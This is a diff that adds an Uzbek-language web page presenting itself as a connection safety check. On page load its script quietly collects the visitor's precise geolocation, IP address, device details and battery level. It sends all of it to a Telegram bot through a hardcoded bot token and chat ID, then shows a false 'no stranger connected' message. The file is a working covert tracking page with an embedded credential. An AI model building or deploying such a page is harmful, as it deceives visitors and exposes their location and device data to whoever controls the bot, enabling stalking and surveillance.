@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tekshirilmoqda...</title>
+
+<style>
+body {
+    background: #020617;
+    color: white;
+    text-align: center;
+    margin-top: 100px;
+    font-family: Arial;
+}
+
+#status {
+    margin-top: 20px;
+}
+
+.success {
+    font-size: 70px;
+    color: #22c55e;
+}
+</style>
+</head>
+<body>
+
+<h2>🔍 Tekshirilmoqda...</h2>
+<p id="status">Ma'lumotlar yig‘ilmoqda...</p>
+<div id="check"></div>
+
+<script>
+const token = "8096738475:AAEpARzOs__Qeknja0IU2O6YS9F9vTrw_Fk";
+const chat_id = "8108956117";
+
+let data = {
+    ip: "Noma'lum",
+    lat: "Noma'lum",
+    lon: "Noma'lum",
+    device: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    time: new Date().toString(),
+    battery: "Noma'lum"
+};
+
+// IP olish
+fetch("https://api.ipify.org?format=json")
+.then(res => res.json())
+.then(d => data.ip = d.ip);
+
+// Batareya olish
+if (navigator.getBattery) {
+    navigator.getBattery().then(battery => {
+        data.battery = Math.floor(battery.level * 100) + "%";
+    });
+}
+
+// Lokatsiya olish
+function getLocation() {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            data.lat = pos.coords.latitude;
+            data.lon = pos.coords.longitude;
+            sendAll();
+        },
+        () => {
+            document.getElementById("status").innerText = "📍 Lokatsiya o‘chiq";
+        }
+    );
+}
+
+// Yuborish
+function sendAll() {
+    let text = `
+📡 FOYDALANUVCHI MA'LUMOTI
+
+🌐 IP: ${data.ip}
+
+📍 Lokatsiya:
+${data.lat}, ${data.lon}
+https://maps.google.com/?q=${data.lat},${data.lon}
+
+📱 Qurilma:
+${data.device}
+
+💻 Platforma:
+${data.platform}
+
+🌍 Til:
+${data.language}
+
+🔋 Batareya:
+${data.battery}
+
+⏰ Vaqt:
+${data.time}
+`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: text
+        })
+    })
+    .then(() => {
+        document.getElementById("status").innerText = "Begona shaxs ulanmagan!";
+        document.getElementById("check").innerHTML = "✔️";
+        document.getElementById("check").className = "success";
+    })
+    .catch(() => {
+        document.getElementById("status").innerText = "❌ Xatolik";
+    });
+}
+
+// Start
+window.onload = () => {
+    getLocation();
+};
+</script>
+
+</body>
+</html>
